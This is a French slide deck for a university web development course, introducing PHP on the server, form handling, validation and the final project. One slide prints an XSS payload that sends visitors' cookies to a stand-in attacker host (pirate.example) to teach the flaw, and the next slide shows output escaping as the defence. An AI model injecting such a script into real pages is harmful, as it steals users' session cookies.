---
marp: true
theme: devweb
paginate: true
footer: 'Développement Web 1 · Amani Selmi · S04 · PHP et le serveur'
---

<!-- _class: titre -->
<!-- _paginate: false -->
<!-- _footer: '' -->

# Développement Web 1
## Séance 4 : PHP et le serveur

**Amani Selmi, PhD-Engineer**

---

## Aujourd'hui

1. Installer et lancer un serveur PHP
2. Ce qui change quand le code tourne **sur le serveur**
3. PHP pour programmeurs
4. Recevoir un formulaire : `$_GET`, `$_POST`
5. Première faille : **XSS**
6. Le **projet final** : lancement
7. Atelier : ClubHub en PHP

---

## Jusqu'ici : un site statique

```
Navigateur ── GET /evenements.html ──▶ Serveur
           ◀── le fichier tel quel ───
```

* Le serveur renvoie un fichier **déjà écrit**.
* Même page pour tout le monde.
* Le formulaire ne va nulle part.

---

## Maintenant : un site dynamique

```
Navigateur ── GET /evenement.php?id=3 ──▶ Serveur
                                          │ 1. lance PHP
                                          │ 2. PHP lit id=3
                                          │ 3. PHP fabrique le HTML
           ◀──────── du HTML ─────────────┘
```

* Le navigateur ne voit **jamais** le code PHP.
* Il reçoit seulement le HTML produit.

<!-- DÉMO : afficher le code source de la page dans le navigateur (Ctrl+U). Pas une ligne de PHP. -->

---

## Chaque requête repart de zéro

1. Une requête arrive
2. PHP exécute le script **du début à la fin**
3. Il envoie la réponse
4. Il **oublie tout** : variables, tableaux, tout

La requête suivante ne sait rien de la précédente.
C'est HTTP *stateless*, vu de l'intérieur. (→ sessions, séance 5)

---

## Lancer un serveur

Dans le dossier du projet :

```bash
php -S localhost:8000
```

Puis ouvrir `http://localhost:8000/bonjour.php`

* Ou XAMPP / WAMP / MAMP : mettre le dossier dans `htdocs`
* Le terminal affiche **chaque requête** reçue. Regardez le !

<div class="piege">

Piège : ouvrir le fichier `.php` en double cliquant (`file://...`). Le navigateur ne sait pas exécuter du PHP.

</div>

---

## PHP dans du HTML

```php
<?php
$title = 'Atelier Arduino';
$places = 20;
?>
<h1><?= $title ?></h1>
<p><?= $places ?> places</p>
```

* `<?php ... ?>` : du code
* `<?= ... ?>` : afficher une valeur (= `<?php echo ... ?>`)
* Tout ce qui est hors des balises est envoyé tel quel

---

## PHP pour programmeurs

```php
$count = 3;                          // variables avec $
$name = "Amine";
echo "Bonjour $name";                // variables dans "..."
echo 'Bonjour ' . $name;             // concaténation : le point

if ($count >= 3 && $name !== '') { }
foreach ($items as $item) { }

function add(int $a, int $b): int {
    return $a + $b;
}
```

Même logique que ce que vous connaissez. `===` comme en JS.

---

## Les tableaux associatifs

```php
$event = [
    'title' => 'Atelier Arduino',
    'capacity' => 20,
];
echo $event['title'];

$events = [$event, $autre];          // tableau de tableaux

foreach ($events as $event) {
    echo $event['title'];
}
foreach ($event as $key => $value) { }
```

Un tableau PHP = une liste **et** un dictionnaire.

---

## Boucles dans le HTML

```php
<ul>
  <?php foreach ($events as $event): ?>
    <li><?= $event['title'] ?></li>
  <?php endforeach; ?>
</ul>
```

Syntaxe `: ... endforeach;` : plus lisible au milieu du HTML.
Pareil : `if (...): ... else: ... endif;`

---

## Réutiliser : `require`

```php
<?php
require __DIR__ . '/includes/functions.php';
$pageTitle = 'Événements';
require __DIR__ . '/includes/header.php';
?>
<main> ... </main>
<?php require __DIR__ . '/includes/footer.php'; ?>
```

* Un seul en-tête pour tout le site
* `__DIR__` : le dossier du fichier actuel (chemins fiables)

---

## Recevoir des données : `$_GET`

```
evenement.php?id=3&tri=date
```

```php
$id = $_GET['id'] ?? null;          // "3" (une chaîne !) ou null

// Mieux : valider en même temps
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
// 3, ou false si ce n'est pas un entier, ou null si absent
```

`??` : valeur par défaut si la clé n'existe pas.

---

## Recevoir un formulaire : `$_POST`

```html
<form action="evenement.php?id=3" method="post">
  <input name="email">
```

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
}
```

* La **clé** = l'attribut `name` du champ
* Pas de `name` → pas de donnée. (Vous vous souvenez de S01 ?)

---

<!-- _class: question -->

## Question

Votre JavaScript valide déjà l'email.

**Pourquoi le vérifier encore en PHP ?**

<!-- DÉMO : envoyer une requête avec curl, sans navigateur : curl -X POST -d "email=nimportequoi" localhost:8000/evenement.php?id=1 . Le JS n'a jamais existé pour curl. -->

---

## Valider côté serveur

```php
$errors = [];

if (mb_strlen($name) < 3) {
    $errors['name'] = 'Au moins 3 caractères.';
}
if (filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
    $errors['email'] = 'Email invalide.';
}
if (!array_key_exists($level, LEVELS)) {
    $errors['level'] = 'Niveau inconnu.';
}

if ($errors === []) { /* tout va bien */ }
```

---

## Réafficher le formulaire proprement

En cas d'erreur :

* garder ce que l'utilisateur a tapé (`value="..."`)
* afficher le message **sous le bon champ**
* ne pas tout effacer (l'utilisateur partirait)

```php
<input name="email" value="<?= e($old['email']) ?>">
<small class="field-error"><?= e($errors['email'] ?? '') ?></small>
```

---

## La faille XSS

Un utilisateur tape dans le champ nom :

```html
<script>document.location='https://pirate.example/?c='+document.cookie</script>
```

Vous l'affichez avec `<?= $name ?>` → le script **s'exécute** chez tous ceux qui voient la page.

*Cross Site Scripting* : l'attaquant injecte du JS dans **votre** site.

---

## La parade : échapper toute sortie

```php
function e(string|int|float|null $value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}
```

`<script>` devient `&lt;script&gt;` : affiché comme du texte, jamais exécuté.

<div class="regle">

Règle de sécurité n° 1 : **toute** donnée affichée passe par `e()`. Toujours. Même celles qui viennent de « chez vous ».

</div>

---

## Codes de statut en PHP

```php
if ($event === null) {
    http_response_code(404);
    echo 'Événement introuvable';
    exit;
}
```

Vérifiez dans F12 → Network : le statut est bien **404**.

---

## Où en est ClubHub ?

| | S03 | S04 |
|---|---|---|
| Pages | 3 fichiers `.html` | `.php` + en-tête commun |
| Événements | écrits à la main | un tableau PHP, une boucle |
| Détail | une seule page | `evenement.php?id=...` |
| Formulaire | validé en JS | **aussi** validé en PHP |
| Stockage | aucun | aucun (séance 6) |

---

<!-- _class: titre -->

# Le projet final
## Lancement

---

## Le principe

Vous avez construit ClubHub avec moi. Maintenant, vous construisez **votre** application.

* En binôme
* Avec les mêmes fondamentaux : HTML, CSS, JS, PHP, MySQL
* **Pas de framework**
* Soutenance individuelle en séance 11

---

## Les quatre règles du projet

1. **Un vrai utilisateur** : un club, une association, votre promo, un commerce...
2. **Une mécanique centrale** au delà du CRUD : calculer, jouer, apparier, classer, planifier, visualiser
3. **Seulement les fondamentaux**
4. **Vous comprenez tout** : questions individuelles et modification en direct

---

## Des idées (à dépasser)

| Application | Mécanique |
|---|---|
| Binômes de révision | Appariement par matières et créneaux |
| Réservation du matériel | Détection des conflits |
| Quiz en direct | Scores, classement en temps réel |
| Jeu à deux tour par tour | Règles côté serveur |
| Partage des dépenses | Qui doit combien à qui |
| Tournoi du campus | Génération du tableau, classement |

**Refusés** : blog, boutique, to do list... sauf mécanique vraiment originale.

---

## Calendrier

| Séance | Étape |
|---|---|
| S04 | Former les binômes, chercher l'idée |
| **S06** | **Proposition** d'une page |
| **S08** | **Jalon 1** : BD, pages, connexion |
| S09 | Revue de code croisée |
| **S10** | **Jalon 2** : tout est gelé |
| **S11** | **Soutenance** |

Cahier des charges : `projet/specification.md`

---

## Atelier : ClubHub en PHP

Énoncé : `semaines/S04-php/atelier/enonce.md`

1. Lancer le serveur, voir `bonjour.php`
2. En-tête et pied de page communs
3. Les événements depuis `data/events.php`
4. `evenement.php?id=...` avec une 404 propre
5. Le formulaire traité et validé en PHP

**Pas noté, mais c'est la base du TP3.**
